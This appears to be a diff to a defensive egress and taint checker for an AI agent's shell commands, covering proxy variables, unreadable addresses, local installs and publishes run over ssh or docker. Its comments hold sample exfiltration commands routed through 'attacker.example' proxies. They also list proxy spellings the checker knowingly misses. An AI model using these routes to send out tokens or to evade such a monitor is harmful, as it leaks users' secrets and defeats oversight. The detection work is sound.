@@ -2744,6 +3225,93 @@ const OPENSSL_ADDRESS_OPTIONS = new Set(['-connect', '-proxy', '-servername', '-
  * catch a shape it cannot read anyway, which is the decision already taken for `git` and `gh`.
  */
 const OBJECT_STORE_EXECUTABLES = new Set(['aws', 'az', 'gcloud', 'gsutil', 's3cmd']);
+
+/**
+ * Clients that open their socket at `http_proxy` when it is set, whether or not their own arguments
+ * are read for an address.
+ *
+ * A different list from `FETCH_CLIENT_EXECUTABLES` because it answers a different question. That
+ * list is the programs whose argument grammar names a far end, and `git`, `gh` and the package
+ * managers are kept off it on purpose - their remote lives in configuration, and requiring an
+ * address of them would card `git pull` and `pip install requests` on every tainted turn. But a
+ * proxy is not their remote. `https_proxy=attacker.example:3128 pip download <token>` opens its
+ * socket at the proxy and nowhere else, so the proxy is the destination whatever the index URL
+ * says, and keying the proxy reader on the narrower list left it unread: the assignment was
+ * stripped as environment and the command judged as though it reached nothing. In front of `git
+ * push` the same variable produced the card a clean push produces, with the proxy invisible on it.
+ *
+ * Every entry honours the shared spelling of the variable through the HTTP library it ships with.
+ * Priced honestly: all of them speak https, so what the proxy sees is the host it is asked to
+ * connect to and the volume of traffic, not the request path - which is why the proxy host alone
+ * is charged and the operands beside it are not.
+ *
+ * `docker` is deliberately absent: a pull is done by the daemon, which does not inherit the
+ * command's environment. A program's OWN spelling of the variable - `PIP_PROXY`,
+ * `npm_config_proxy`, `CARGO_HTTP_PROXY` - is not read either; that is a list per program that
+ * drifts, and it is stated in the limits comment above `callDestinations`.
+ */
+const PROXY_HONOURING_EXECUTABLES = new Set([
+  ...FETCH_CLIENT_EXECUTABLES,
+  ...REMOTE_SPEC_EXECUTABLES,
+  ...OBJECT_STORE_EXECUTABLES,
+  'apt',
+  'apt-get',
+  'brew',
+  'bundle',
+  'bundler',
+  'cargo',
+  'composer',
+  'gem',
+  'gh',
+  'git',
+  'go',
+  'npm',
+  'npx',
+  'pip',
+  'pip3',
+  'pipx',
+  'pnpm',
+  'poetry',
+  'twine',
+  'uv',
+  'yarn'
+]);
+
+/**
+ * Whether a program opens its socket at the proxy variable, by the name it is installed under.
+ *
+ * `pip3.12` is how a distribution installs pip beside the interpreter it belongs to, and it is the
+ * same program as `pip`; a set of exact names saw a program it had never heard of and read the
+ * proxy in front of it as environment for nothing. The versioned spelling is read for the two
+ * families that are installed that way, and for no other name.
+ */
+const honoursProxy = (executable: string): boolean => {
+  const name = executable.toLowerCase();
+  return (
+    PROXY_HONOURING_EXECUTABLES.has(name) ||
+    /^pip3?(?:\.\d+)?$/.test(name) ||
+    /^(?:cargo|gem|bundle|composer)\d+(?:\.\d+)*$/.test(name)
+  );
+};
+
+/**
+ * The option the proxy variable is rewritten as, and the spellings the clients themselves take.
+ *
+ * `--proxy` is what `proxyOptionsFrom` appends and what `curl`, `pip` and `npm` accept on the
+ * command line; `--https-proxy` is npm's second spelling. Read for every client on the list above
+ * and for no other, so a program with a `--proxy` that means something local is never asked.
+ *
+ * A proxy value may carry a SOCKS scheme - `socks5h://attacker.example:1080` - which says how to
+ * talk to the proxy and nothing about where it is, so that scheme comes off before the host is
+ * read; an http(s) one is left as written, so the literal-URL scan beside this reader sees the
+ * same spelling and the host is charged once. A value this cannot read is returned as written,
+ * because a socket that opens at `$P` opens somewhere nobody can see, and that is the strongest
+ * case for asking rather than the weakest.
+ */
+const PROXY_OPTIONS = new Set(['--proxy', '--https-proxy']);
+const proxyAddress = (value: string): string =>
+  addressFromArgument(value.replace(/^socks[45][ah]?:\/\//i, '')) ||
+  (/[$`]/.test(value) ? value : '');
 
 /**
  * Where an `az storage` call puts its bytes.
@@ -2865,11 +3433,19 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
   const redirects: string[] = [];
   const named: string[] = [];
   const forwards: string[] = [];
+  const proxies: string[] = [];
   let addressFile = false;
   let redirected = false;
   commandArgs.forEach((_argument, index) => {
     const localOption = optionValueAt(commandArgs, index, local);
     if (localOption?.takesNext) skip.add(index + 1);
+    const proxyOption = honoursProxy(name)
+      ? optionValueAt(commandArgs, index, PROXY_OPTIONS)
+      : null;
+    if (proxyOption) {
+      if (proxyOption.takesNext) skip.add(index + 1);
+      proxies.push(proxyOption.value);
+    }
     if (optionValueAt(commandArgs, index, ownEntry(ADDRESS_FILE_OPTIONS, name))) addressFile = true;
     const forwardOption =
       name === 'ssh' ? optionValueAt(commandArgs, index, SSH_FORWARD_OPTIONS) : null;
@@ -2939,6 +3515,11 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
   const wroteAnAddress = addressTable
     ? named.length > 0
     : FETCH_CLIENT_EXECUTABLES.has(name) && (candidates.length > 0 || addressFile);
+  // The proxy is appended after everything else is settled rather than joined to the addresses
+  // above, so that a fetch whose own address is unreadable is still asked about as one: a readable
+  // proxy in front of `curl "$U"` must not turn the unreadable-address case into the read-and-
+  // cleared one.
+  const proxied = proxies.map(proxyAddress).filter(Boolean);
   if (!addresses.length)
     return wroteAnAddress
       ? // Carded and charged as the unreadable address it is. What goes back is the token the
@@ -2949,17 +3530,18 @@ const commandAddresses = ([executable = '', ...commandArgs]: readonly string[]):
           [
             commandArgs.find((argument) => /[$`]/.test(argument)) || name,
             ...carried.map(([, value]) => value)
-          ].join(' ')
+          ].join(' '),
+          ...proxied
         ]
-      : [];
-  if (!carried.length) return addresses;
+      : proxied;
+  if (!carried.length) return [...addresses, ...proxied];
   const [first = '', ...rest] = addresses;
   try {
     const url = new URL(first);
     for (const [option, value] of carried) url.searchParams.append(option, value);
-    return [url.href, ...rest];
+    return [url.href, ...rest, ...proxied];
   } catch {
-    return addresses;
+    return [...addresses, ...proxied];
   }
 };
 
@@ -3047,11 +3629,24 @@ const devSocketAddresses = (text: string): string[] =>
  *    `git config http.proxy attacker.example:3128 && git push` is 0 destinations, because the far
  *    end is in a file this never reads and `git` is deliberately unread anyway - see the note on
  *    the fetch clients for why requiring an address of it would card `git pull` on every tainted
- *    turn. The environment half of this entry USED to be here and is closed: `PROXY_VARIABLES`
- *    reads `http_proxy`, `https_proxy`, `ALL_PROXY`, `ftp_proxy` and `rsync_proxy` wherever in a
- *    script they are set, and rewrites them as the `--proxy` they mean. It was the only entry on
- *    this list that did not merely miss - it answered confidently with the wrong host, which is the
- *    shape `REDIRECTING_VALUE_OPTIONS` calls worse than unreadable.
+ *    turn. `git -c http.proxy=attacker.example:3128 push` is the same file written one step
+ *    earlier and is 0 destinations for the same reason, and so is git's environment spelling of
+ *    its configuration, `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=http.proxy GIT_CONFIG_VALUE_0=…`,
+ *    which raises the plain push card with the proxy invisible on it. The same class in every
+ *    other client: `npm config set proxy … ; npm view …` and `pip config set global.proxy … &&
+ *    pip download …` write the proxy into a file the next command reads, and this file reads
+ *    neither. The environment half of this entry USED to be here and is closed: `PROXY_VARIABLES` reads `http_proxy`, `https_proxy`, `ALL_PROXY`,
+ *    `ftp_proxy` and `rsync_proxy` wherever in a script they are set, and rewrites them as the
+ *    `--proxy` they mean, for every client in `PROXY_HONOURING_EXECUTABLES` - the package
+ *    managers, `git` and `gh` included, since a proxy is where their socket opens whatever their
+ *    remote is. It was the only entry on this list that did not merely miss - it answered
+ *    confidently with the wrong host, which is the shape `REDIRECTING_VALUE_OPTIONS` calls worse
+ *    than unreadable.
+ * 13. A PROXY IN A PROGRAM'S OWN SPELLING OF THE VARIABLE. `PIP_PROXY=attacker.example:3128 pip
+ *    install requests`, `npm_config_proxy=…` and `CARGO_HTTP_PROXY=…` are 0 destinations: the
+ *    shared spelling is read for every client that honours it, and the per-program spellings are a
+ *    list per program that drifts. So is `https_proxy=… docker pull`, because the pull is done by
+ *    a daemon that does not inherit the command's environment.
  * 8. AN OBJECT STORE THE OWNER HAS NOT NAMED IN A FORM THE HARNESS RECORDED. `aws s3 ls
  *    s3://dan-backups` resolves to `dan-backups.s3.amazonaws.com`, and on a tainted turn a host
  *    nobody named is a sink - one card, exactly as a novel https host raises one. Naming the bucket
@@ -3168,13 +3763,40 @@ const ADDRESS_NAMING_EXECUTABLES = new Set([
  */
 const UNREADABLE_VALUE = /\$\(|`|\$\{?[A-Za-z_]/;
 
+/**
+ * An address `commandAddresses` handed back as it was written because it could not read it: the
+ * `"$U"` of `curl -s "$U"`, the `curl` of `curl -K curlrc`, the `$P` of a proxy in a variable.
+ * Every address the reader could read comes back as a URL; one that will not parse is the token.
+ */
+const willNotParse = (address: string): boolean => {
+  try {
+    new URL(address);
+    return false;
+  } catch {
+    return true;
+  }
+};
+
 export const reachesAnUnreadableFarEnd = (args: Record<string, unknown>): boolean =>
-  UNREADABLE_VALUE.test(commandText(args)) &&
-  effectiveCommands(args).some(
-    (command) =>
-      ADDRESS_NAMING_EXECUTABLES.has((command[0] ?? '').toLowerCase()) &&
-      commandAddresses([...command]).length === 0
-  );
+  effectiveCommands(args).some((command) => {
+    if (!ADDRESS_NAMING_EXECUTABLES.has((command[0] ?? '').toLowerCase())) return false;
+    const addresses = commandAddresses([...command]);
+    /*
+     * Two ways for the far end to be unreadable, and the second was not asked. A substitution
+     * that `scriptCommands` split off leaves the client with no operand at all, which is the
+     * empty case below; an operand the client kept but nobody can resolve - `"$U"`, `${U}`, a
+     * file the addresses are listed in - comes back from `commandAddresses` as the token itself,
+     * and a test for "no addresses" read that as an address that had been read. So on a clean turn
+     * in balanced `curl -s "$U"` was free, `curl -s -K curlrc` was free, `wget -i urls.txt` was
+     * free, and the card whose own text says "connects to somewhere this computer could not read
+     * out of the command" was unreachable from a curl - while `curl -s $(cat u)` beside them
+     * carded. The provenance arm already fails closed on the token; this is the ordinary arm
+     * asking the same question.
+     */
+    return addresses.length
+      ? addresses.some(willNotParse)
+      : UNREADABLE_VALUE.test(commandText(args));
+  });
 
 /**
  * The addresses in one call that leave this computer, and the host each one reaches.
@@ -3515,12 +4137,51 @@ const NETWORK_CLIENT_EXECUTABLES = new Set([
  * Asked of a command rather than of an invocation, so the same three tests apply to `curl …`, to
  * the `curl` inside `bash -lc '…'`, and to the `curl` inside `timeout 30 …`.
  */
+/**
+ * An install told to stay on this computer, or handed only files that are already on it.
+ *
+ * `pip install -e .`, `pip install ./dist/x.whl` and `npm install --offline` install the owner's
+ * own tree, and each was marked as bringing back somebody else's bytes on the strength of the verb
+ * alone. An operand is local when it is spelled as a path or as an archive; a name (`requests`) or
+ * a requirements file still resolves against an index and still taints. The editable install may
+ * still fetch the dependencies the tree names - that is the same bytes `pip install requests`
+ * brings back for its dependencies, and the operand the owner wrote is their own directory, which
+ * is the thing this reader is asked about.
+ */
+const OFFLINE_INSTALL_OPTIONS = new Set(['--offline', '--no-index', '--prefer-offline']);
+
+/**
+ * The options that make a network client print about itself instead of connecting. Case matters:
+ * `curl -V` is the version and `curl -v` is a verbose fetch.
+ */
+const INFORMATIONAL_CLIENT_OPTIONS = new Set(['-V', '--version', '-h', '--help', '-M', '--manual']);
+const LOCAL_INSTALL_OPERAND =
+  /^(?:\.{1,2}(?:\/|$)|\/|~|file:)|\.(?:whl|tgz|tar\.gz|zip|gem|crate|deb|rpm)$/;
+const installsOnlyLocalFiles = (rest: readonly string[]): boolean => {
+  if (rest.some((argument) => OFFLINE_INSTALL_OPTIONS.has(argument.toLowerCase()))) return true;
+  const verbAt = rest.findIndex((argument) => packageInstallCommands.has(argument.toLowerCase()));
+  const operands = rest
+    .slice(verbAt + 1)
+    .map(unquoted)
+    .filter((argument) => argument && !argument.startsWith('-'));
+  return operands.length > 0 && operands.every((operand) => LOCAL_INSTALL_OPERAND.test(operand));
+};
+
 const fetchesRemoteContent = (command: readonly string[]): boolean => {
   const [executable = '', ...rest] = command;
   const name = executable.toLowerCase();
   const addresses = commandAddresses([...command]);
   const reaches =
-    NETWORK_CLIENT_EXECUTABLES.has(name) ||
+    /*
+     * A client asked for its version or its manual prints and exits. `curl --version`,
+     * `curl -V`, `curl --help` and `wget --version` open no socket, and each was 'network command
+     * output' on the strength of the executable's name alone - after which the turn reported
+     * itself tainted and every write after it was carded. Keyed on the option and not on the
+     * absence of an operand, because a bare `curl` at the end of an `xargs` reads its operands
+     * off the pipe and does reach somewhere.
+     */
+    (NETWORK_CLIENT_EXECUTABLES.has(name) &&
+      !rest.some((argument) => INFORMATIONAL_CLIENT_OPTIONS.has(argument))) ||
     /*
      * Two clients that only reach the network on some of their invocations, asked of the one reader
      * that knows their grammar rather than of a second copy of it.
@@ -3536,7 +4197,8 @@ const fetchesRemoteContent = (command: readonly string[]): boolean => {
     ((name === 'openssl' || OBJECT_STORE_EXECUTABLES.has(name)) && addresses.length > 0) ||
     (name === 'git' && NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '')) ||
     (packageRemovalExecutables.has(name) &&
-      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())));
+      rest.some((argument) => packageInstallCommands.has(argument.toLowerCase())) &&
+      !installsOnlyLocalFiles(rest));
   /*
    * And then where it went, for the clients that write their far end down.
    *
@@ -3555,6 +4217,7 @@ const fetchesRemoteContent = (command: readonly string[]): boolean => {
 export const untrustedShellOrigin = (args: Record<string, unknown>): string | null => {
   const commandArgs = Array.isArray(args.args) ? args.args.map(String) : [];
   const script = commandScript(args);
+  const commands = effectiveCommands(args);
   /*
    * The invocation used to be judged at its outer executable, with a scan for a literal http(s)
    * address as the only thing that reached inside a script. That scan is what made the hole look
@@ -3576,18 +4239,101 @@ export const untrustedShellOrigin = (args: Record<string, unknown>): string | nu
    * the input to every other floor in this file.
    */
   if (
-    effectiveCommands(args).some(fetchesRemoteContent) ||
-    literalUrlsInCommand(args).some(readsAnotherComputer) ||
+    commands.some(fetchesRemoteContent) ||
+    /*
+     * The literal scan, for every command that could have opened a socket and for no other. It
+     * is the one reader that reaches an address inside `python3 -c`, `node -e` and every
+     * interpreter this file does not parse, and it stays for that. What it must not do is mark a
+     * turn for MENTIONING an address: `echo http://192.168.1.50/notes`, `grep -r
+     * "http://wiki.internal" src/`, `git commit -m "point config at http://wiki.internal/…"` and
+     * `export http_proxy=http://10.0.0.5:3128` each open nothing and each was 'network command
+     * output', after which a write to the brief on the same turn was carded as a tainted write.
+     * So the scan is asked only when some command in the call is one whose socket this file
+     * cannot rule out - an interpreter, a program it has never heard of - and not when every
+     * command is a builtin, a coreutil that reads files, a file writer, or git off the network.
+     */
+    (commands.some(mayOpenASocket) && literalUrlsInCommand(args).some(readsAnotherComputer)) ||
     // A socket opened for reading is a client with no executable at all. See DEV_SOCKET_READ for
     // why the write-only spelling is not one.
     (DEV_SOCKET_READ.test(script) && devSocketAddresses(script).some(readsAnotherComputer))
   )
     return 'network command output';
-  // Split on the same separators the durable-path rule uses, so a redirect or a pipe inside an
-  // inline script cannot hide the path the way `cat < downloads/x` would past a bare argument scan.
-  const tokens = [...commandArgs, ...script.split(/[\s'"`>|;()<]+/)].filter(Boolean);
+  /*
+   * The download directory, read by the commands that READ it. A path under it is somebody else's
+   * bytes only once a command puts them in the window: `ls -la workspace/downloads/`, `stat`,
+   * `rm`, `test -f` answer a question about the file and show none of it, and a redirect INTO
+   * the directory writes rather than reads. Each of those was 'downloaded file …' on the path
+   * alone. The operands of every other command are read - split on the same separators the
+   * durable-path rule uses, so a redirect or a pipe inside an inline script cannot hide the path
+   * the way `cat < downloads/x` would past a bare argument scan - and a call this could not
+   * decompose at all is scanned whole, as it was, because unreadable fails closed.
+   */
+  const tokens = commands.length
+    ? commands
+        .filter(([executable = '']) => !METADATA_ONLY_EXECUTABLES.has(executable.toLowerCase()))
+        .flatMap(([, ...rest]) => withoutWriteRedirects(rest))
+        .flatMap((token) => token.split(/[\s'"`>|;()<]+/))
+        .filter(Boolean)
+    : [...commandArgs, ...script.split(/[\s'"`>|;()<]+/)].filter(Boolean);
   const quarantined = tokens.find(isQuarantinedDownloadPath);
   return quarantined ? `downloaded file ${quarantineRelative(quarantined)}` : null;
+};
+
+/**
+ * Commands whose only relation to a file is its name, size or existence - none of its bytes reach
+ * the window. Deliberately small, and `mv` and `cp` are deliberately absent: both carry the
+ * bytes somewhere the quarantine rule cannot see, and the taint on the move is the one time the
+ * floor is looking.
+ */
+const METADATA_ONLY_EXECUTABLES = new Set([
+  '[',
+  'basename',
+  'chmod',
+  'chown',
+  'dirname',
+  'du',
+  'file',
+  'ls',
+  'mkdir',
+  'readlink',
+  'realpath',
+  'rm',
+  'rmdir',
+  'stat',
+  'test',
+  'touch',
+  'unlink'
+]);
+
+/** A command's tokens with the target of every writing redirect taken out. `<` is a read and stays. */
+const withoutWriteRedirects = (tokens: readonly string[]): string[] => {
+  const kept: string[] = [];
+  for (let at = 0; at < tokens.length; at += 1) {
+    const token = tokens[at] ?? '';
+    if (/^(?:\d|&)?>>?\|?$/.test(token)) {
+      at += 1;
+      continue;
+    }
+    if (/^(?:\d|&)?>/.test(token)) continue;
+    kept.push(token);
+  }
+  return kept;
+};
+
+/**
+ * Whether a command is one this file cannot say opens no socket. The builtins and the coreutils
+ * that read or write files are named; git is named when its subcommand stays off the network; an
+ * assignment alone runs nothing. Everything else - an interpreter, a program with no table here -
+ * might, and for those the literal address scan is the reader.
+ */
+const mayOpenASocket = ([executable = '', ...rest]: readonly string[]): boolean => {
+  const name = executable.toLowerCase();
+  if (name === 'git') return NETWORK_GIT_SUBCOMMANDS.has(gitSubcommand([...rest]) ?? '');
+  return !(
+    noEgressExecutables.has(name) ||
+    READ_ONLY_EXECUTABLES.has(name) ||
+    FILE_WRITING_EXECUTABLES.has(name)
+  );
 };
 
 /* ---------------------------------------- past a word this file has never heard of ------------ */
@@ -3655,9 +4401,100 @@ export const publishingOperation = (
     if (registry) return { kind: 'registry', operation: registry };
     const deployment = deploymentOperation(name, rest, index === 0);
     if (deployment) return deployment;
+    // `ssh host npm publish` publishes from the far end with the far end's credentials, and the walk
+    // stopped dead at `ssh`, which `placeableExecutable` names. Read the remote command instead - the
+    // host and ssh's own options come off the way `sudo`'s do - and judge THAT: `ssh host ls` and
+    // `ssh -V` still raise nothing (the remote command is a read, or is absent), while a publish
+    // carried to the other end is seen. Read past the host by grammar rather than by walking on,
+    // because a bare hostname like `host` is itself a name this file places (the DNS tool).
+    if (name === 'ssh') {
+      // ssh joins its remote arguments with spaces and hands the far end one string, so
+      // `['host', 'npm publish']` and `['host', 'npm', 'publish']` run the same command there. The
+      // joined spelling arrived here as one token that no operation table could match.
+      const remote = sshRemoteCommand(rest)
+        .flatMap((token) => unquoted(token).split(/\s+/))
+        .filter(Boolean);
+      return remote.length ? publishingOperation(remote) : null;
+    }
+    // `docker run img npm publish` publishes from inside the container. The image and `run`'s options
+    // are not names this file places, so the walk resumes past them and stops at the first placeable
+    // word - which keeps `docker run img npm test` and `docker build` null. `docker exec` is judged
+    // separately, against another box's filesystem; only `run` carries a command this walk is about.
+    // `docker container run` is the long form of which `docker run` is the shortcut, and it carries
+    // the same command.
+    if (name === 'docker' || name === 'podman') {
+      const words = rest
+        .slice(0, 2)
+        .map((token) => (unquoted(token).split('/').pop() ?? '').toLowerCase());
+      if (words[0] === 'run' || (words[0] === 'container' && words[1] === 'run')) continue;
+    }
+    /*
+     * An interpreter placed after the image - `docker run img sh -c "npm publish"` - is a name
+     * this file places, so the walk used to stop at it and the script in its `-c` was never read.
+     * A top-level interpreter is read by `scriptCommands` before this walk ever sees it; one
+     * reached mid-walk is read here the same way, and judged by what its script runs.
+     */
+    if (commandInterpreters.has(name)) {
+      const inner = nestedScript(rest);
+      if (!inner.length) return null;
+      for (const command of scriptCommands(inner.join(' '))) {
+        const carried = publishingOperation(command);
+        if (carried) return carried;
+      }
+      return null;
+    }
     if (placeableExecutable(name)) return null;
   }
   return null;
+};
+
+/**
+ * The command an `ssh` invocation runs on the far end, with ssh's own options and the host removed.
+ *
+ * The option surface is ssh's value-taking flags; everything up to and including the first token
+ * that is not one of those, and not itself a flag, is ssh and its host, and what follows runs on
+ * the other computer. `ssh -V` and `ssh host` (no command) return nothing.
+ */
+const SSH_VALUE_OPTIONS = new Set([
+  '-b',
+  '-c',
+  '-D',
+  '-E',
+  '-e',
+  '-F',
+  '-I',
+  '-i',
+  '-J',
+  '-L',
+  '-l',
+  '-m',
+  '-O',
+  '-o',
+  '-p',
+  '-Q',
+  '-R',
+  '-S',
+  '-W',
+  '-w'
+]);
+const sshRemoteCommand = (rest: readonly string[]): string[] => {
+  let index = 0;
+  let hostSeen = false;
+  for (; index < rest.length; index += 1) {
+    const token = rest[index] ?? '';
+    if (hostSeen) return [...rest.slice(index)];
+    if (token === '--') {
+      hostSeen = true;
+      continue;
+    }
+    if (SSH_VALUE_OPTIONS.has(token)) {
+      index += 1;
+      continue;
+    }
+    if (token.startsWith('-')) continue;
+    hostSeen = true;
+  }
+  return [];
 };
 
 /* -------------------------------------------------------------- what a rewind does not put back */
